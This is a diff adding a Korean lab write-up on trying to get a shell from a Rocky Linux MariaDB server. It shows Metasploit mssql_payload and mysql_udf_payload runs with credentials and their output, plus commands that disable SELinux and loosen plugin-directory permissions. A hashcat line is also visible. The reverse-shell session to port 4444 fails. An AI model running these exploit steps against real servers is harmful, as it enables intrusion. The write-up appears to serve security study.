@@ -146,3 +146,111 @@ hashcat -m 300 -a 0 /root/Desktop/hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ---
+# MySQL UDF를 이용한 쉘 탈취 시도 (실습 중단)
+
+> 결론: 실습 환경(SELinux, 디렉토리 권한, 네트워크 구성 등)의 제약으로 세션 획득까지는 도달하지 못하고 중단
+
+---
+
+## 1. 최초 시도: MSSQL 페이로드 방식 (구조적으로 불가능했던 접근)
+
+```
+use exploit/windows/mssql/mssql_payload
+set rhost 192.168.63.128
+set password qwer1234
+set srvhost 192.168.63.133
+set METHOD old
+run
+```
+
+### 왜 안 되는지
+
+- `exploit/windows/mssql/mssql_payload`는 **Windows 전용 모듈**
+- `xp_cmdshell`을 이용해 Windows 실행 파일을 심는 방식인데, 대상 서버는 **Rocky Linux(리눅스)에 설치된 SQL Server for Linux**
+- Linux 환경에서는 애초에 대상 자체가 안 맞아 성립하지 않는 시도였음
+- → 방향을 MySQL/MariaDB의 UDF(User Defined Function) 방식으로 변경
+
+---
+
+## 2. MySQL UDF Payload 시도
+
+```
+use exploit/multi/mysql/mysql_udf_payload
+set rhost 192.168.63.128
+set username test
+set password P@SSW0RD
+run
+```
+
+### 시도 1: Permission Denied
+
+```
+[-] Can't create/write to file '/usr/lib64/mariadb/plugin/qZKcFslT.so' (Errcode: 13 "Permission denied")
+[-] Can't open shared library 'qZKcFslT.so' (errno: 2, cannot open shared object file)
+[*] MySQL function sys_exec() not available
+[*] Exploit completed, but no session was created.
+```
+
+**원인 조사:**
+
+```bash
+ps -ef | grep -i maria
+# mysql  1087  1  0 10:53 ?  /usr/libexec/mariadbd --basedir=/usr
+```
+
+→ `mariadbd`는 `mysql` 계정으로 실행 중
+
+```bash
+ls -ld /usr/lib64/mariadb/plugin/
+# drwxr-xr-x. 2 root root 4096 ... /usr/lib64/mariadb/plugin/
+```
+
+→ 디렉토리 소유자가 `root:root`, 권한 `755` → `mysql` 계정은 쓰기 권한이 없음
+
+**SELinux 차단 가능성 확인
+```bash
+getenforce
+# Enforcing
+```
+
+→ SELinux도 추가로 차단할 가능성 있는 상태
+
+**조치:**
+mysql 권한 변경 및 소유자 변경을 통해 소유자를 mysql로 변경 시도 및 SELinux getenforce 해제
+
+```bash
+sudo chown mysql:mysql /usr/lib64/mariadb/plugin/
+sudo chmod 775 /usr/lib64/mariadb/plugin/
+sudo setenforce 0
+```
+
+### 시도 2: 업로드는 성공, 세션 생성 실패
+
+```
+[*] Uploading lib_mysqludf_sys_64.so library to /usr/lib64/mariadb/plugin/UDpWrHdI.so...
+[*] Checking for sys_exec()...
+[*] Command Stager progress - 100.00% done (2603/2603 bytes)
+[*] Exploit completed, but no session was created.
+```
+
+- 권한/SELinux 문제 해결 후 **UDF 라이브러리 업로드 및 명령 실행(Command Stager) 진행**
+- 하지만 **TCP 세션(4444 포트로 Kali에 접속)이 실제로 붙지 않아 최종 세션 생성 실패**한다는 메시지가 출력되네..
+
+### 세션 실패 추정 원인 (미확인 상태에서 실습 중단)
+
+- Kali 쪽 리스너(4444) 또는 방화벽 이슈 가능성
+- `LHOST`/`SRVHOST` 설정 불일치 가능성
+- Rocky Linux 자체 방화벽의 아웃바운드 필터링 가능성
+- SELinux가 `mariadbd`의 외부 네트워크 연결(아웃바운드) 자체를 별도로 제한했을 가능성
+
+---
+
+## 3. 실습 중단 결정
+
+- 실습 환경(리소스 제약, SELinux, 네트워크 구성 등)이 겹치며 트러블슈팅 난이도가 실습 목적(쉘 탈취) 대비 과도하게 높아짐
+- 세션 획득 단계 직전까지는 도달했으므로, UDF 업로드/권한 우회의 핵심 원리는 확인됨
+- 추후 재도전 시 고려할 것:
+    1. Kali 리스너 정상 동작 여부 (`ss -tlnp | grep 4444`)
+    2. `msf6` 모듈 `options`에서 `LHOST` 값 재확인
+    3. Rocky Linux 아웃바운드 방화벽 규칙 (`firewall-cmd --list-all`)
+    4. `VERBOSE true` 설정 후 상세 로그로 정확한 실패 지점 특정
